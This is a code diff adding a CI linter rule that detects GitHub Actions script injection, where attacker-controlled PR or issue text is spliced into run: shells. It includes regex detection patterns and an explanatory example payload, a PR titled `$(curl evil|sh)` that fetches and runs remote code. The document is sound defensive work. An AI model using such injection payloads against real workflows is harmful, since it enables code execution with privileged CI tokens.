@@ -22,6 +22,15 @@ auto-run into arbitrary code execution with a privileged token, or leak a secret
            actionlint caught it, but a hand-written ignore claiming the event was
            "valid and load-bearing" silenced the one tool that was right.
 
+  RULE D - No `run:` shell step may interpolate ATTACKER-CONTROLLABLE context (a PR/issue
+           title or body, a comment/review body, a commit message, `github.head_ref`, a PR
+           head ref/label) directly with `${{ ... }}`. That is GitHub Actions script
+           injection: the text is spliced into the shell before it runs, so a PR titled
+           `$(curl evil|sh)` executes. The safe pattern (which the multi-duck-review gate
+           uses) is to bind the value to an `env:` var and reference it as "$VAR" in the
+           script, so the runner passes it as data, never as code. This also blunts
+           prompt-injection reaching any LLM step downstream of the shell.
+
 Exit non-zero on any violation. Standard library plus PyYAML only.
 """
 import glob
@@ -86,6 +95,51 @@ _SECRETS_RES = (
     (re.compile(r"\bsecrets\s*\["), "secrets['...']"),
     (re.compile(r"\bsecrets\s*:\s*inherit"), "secrets: inherit"),
 )
+# RULE D: attacker-controllable expression contexts that must never be spliced into a run: shell.
+# Matches a PR/issue title or body, a comment/review/discussion body, a commit message, the page
+# name, a commit author name/email, github.head_ref, a PR head ref/label, and toJSON() of any
+# github.event object (serializing it into the shell is equally injectable). SHAs, numbers, and
+# logins are intentionally NOT here - they are constrained and are the safe metadata values run:
+# steps legitimately use. Bracket/index notation (`['body']`, `["pull_request"]`, `[0]`) is
+# normalized to dotted form first, so `github.event.pull_request['body']` cannot evade the guard.
+_EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
+_BRACKET_INDEX_RE = re.compile(r"\[\s*['\"]?([\w-]+)['\"]?\s*\]")
+_INJECTABLE_CTX_RE = re.compile(
+    r"github\.head_ref"
+    r"|github\.event\.pull_request\.head\.(?:ref|label)"
+    r"|github\.event\.[\w.]*\.(?:body|title|message|page_name)\b"
+    r"|github\.event\.[\w.]*\.author\.(?:name|email)\b"
+    r"|toJSON\(\s*github\.event\b",
+    re.IGNORECASE,
+)
+
+
+def _normalize_expr(expr):
+    """Rewrite bracket/index property access to dotted form so both notations are checked alike:
+    `github['event']['pull_request']['body']` -> `github.event.pull_request.body`."""
+    prev = None
+    out = expr
+    # Repeat until stable so chained `[...][...]` segments all collapse.
+    while out != prev:
+        prev = out
+        out = _BRACKET_INDEX_RE.sub(r".\1", out)
+    return out
+
+
+def _iter_run_scripts(doc):
+    """Yield (job_id, step_index, run_text) for every step that carries a string `run:` script."""
+    jobs = doc.get("jobs")
+    if not isinstance(jobs, dict):
+        return
+    for job_id, job in jobs.items():
+        if not isinstance(job, dict):
+            continue
+        steps = job.get("steps")
+        if not isinstance(steps, list):
+            continue
+        for idx, step in enumerate(steps):
+            if isinstance(step, dict) and isinstance(step.get("run"), str):
+                yield job_id, idx, step["run"]
 
 
 def check_workflow(path):
@@ -122,6 +176,17 @@ def check_workflow(path):
                     rel + ": RULE B - a pull_request workflow must not reference " + label
                     + " (it executes PR-authored code). Put privileged, secret-using steps in a "
                     "separate push or pull_request_target workflow.")
+
+    # RULE D: no run: shell step may splice attacker-controllable context in with ${{ ... }}.
+    for job_id, idx, run_text in _iter_run_scripts(doc):
+        for m in _EXPR_RE.finditer(run_text):
+            hit = _INJECTABLE_CTX_RE.search(_normalize_expr(m.group(1)))
+            if hit:
+                violations.append(
+                    rel + ": RULE D - job '" + str(job_id) + "' step " + str(idx)
+                    + " interpolates attacker-controllable context `" + hit.group(0)
+                    + "` straight into a run: shell (script injection). Bind it to an env: var and "
+                    'reference it as "$VAR" in the script so the runner passes it as data, not code.')
 
     return violations
 
